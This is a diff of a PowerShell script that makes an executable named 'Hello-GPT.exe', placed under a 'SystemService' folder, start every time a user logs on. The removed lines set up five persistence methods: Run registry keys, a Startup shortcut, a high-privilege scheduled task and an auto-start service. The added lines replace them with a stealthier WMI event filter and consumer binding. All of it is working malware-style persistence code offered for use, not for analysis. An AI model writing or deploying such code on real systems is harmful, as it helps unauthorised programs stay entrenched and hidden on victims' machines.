@@ -1,55 +1,34 @@
-# Set the full path to your EXE file here
-$exePath = "C:\ProgramData\SystemService\Hello-GPT.exe"
+# ========================
+# WMI Event Subscription Persistence
+# ========================
 
-# 1. Registry Run Key (Current User)
+$exePath = "C:\ProgramData\SystemService\Hello-GPT.exe"  # Change to your EXE path
+$filterName = "GPTEventFilter"
+$consumerName = "GPTCommandConsumer"
+
 try {
-    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-        -Name "PersistenceRunHKCU" `
-        -Value $exePath `
-        -PropertyType String -Force
-    Write-Output "✔️ Added HKCU Run key persistence"
-} catch {
-    Write-Warning "❌ Failed to add HKCU Run key: $_"
-}
+    # Create the Event Filter (runs when user logs in)
+    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+        Name = $filterName;
+        EventNamespace = "root\cimv2";
+        QueryLanguage = "WQL";
+        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_ComputerSystem' AND TargetInstance.UserName != NULL"
+    }
 
-# 2. Registry Run Key (Local Machine - Admin Required)
-try {
-    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
-        -Name "PersistenceRunHKLM" `
-        -Value $exePath `
-        -PropertyType String -Force
-    Write-Output "✔️ Added HKLM Run key persistence"
-} catch {
-    Write-Warning "❌ Failed to add HKLM Run key (requires admin): $_"
-}
+    # Create the CommandLineEventConsumer
+    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+        Name = $consumerName;
+        CommandLineTemplate = "`"$exePath`"";
+        RunInteractively = $false
+    }
 
-# 3. Startup Folder Shortcut
-try {
-    $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\persistence.lnk"
-    $WshShell = New-Object -ComObject WScript.Shell
-    $Shortcut = $WshShell.CreateShortcut($shortcutPath)
-    $Shortcut.TargetPath = $exePath
-    $Shortcut.Save()
-    Write-Output "✔️ Added Startup folder shortcut"
-} catch {
-    Write-Warning "❌ Failed to create Startup shortcut: $_"
-}
+    # Bind the Filter and Consumer
+    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
+        Filter = $filter;
+        Consumer = $consumer
+    }
 
-# 4. Scheduled Task (Run at user logon)
-try {
-    schtasks /create /tn "PersistenceTask" /tr "`"$exePath`"" /sc onlogon /rl highest /f | Out-Null
-    Write-Output "✔️ Created scheduled task for persistence"
+    Write-Output "✔️ WMI Event Subscription persistence added"
 } catch {
-    Write-Warning "❌ Failed to create scheduled task: $_"
+    Write-Warning "❌ Failed to create WMI persistence: $_"
 }
-
-# 5. Windows Service (Admin only)
-try {
-    New-Service -Name "PersistenceService" -BinaryPathName $exePath -StartupType Automatic
-    Start-Service -Name "PersistenceService"
-    Write-Output "✔️ Created and started persistent service"
-} catch {
-    Write-Warning "❌ Failed to create service (admin needed): $_"
-}
-
-Write-Output "`n✅ Persistence setup complete. Reboot to test the effects."
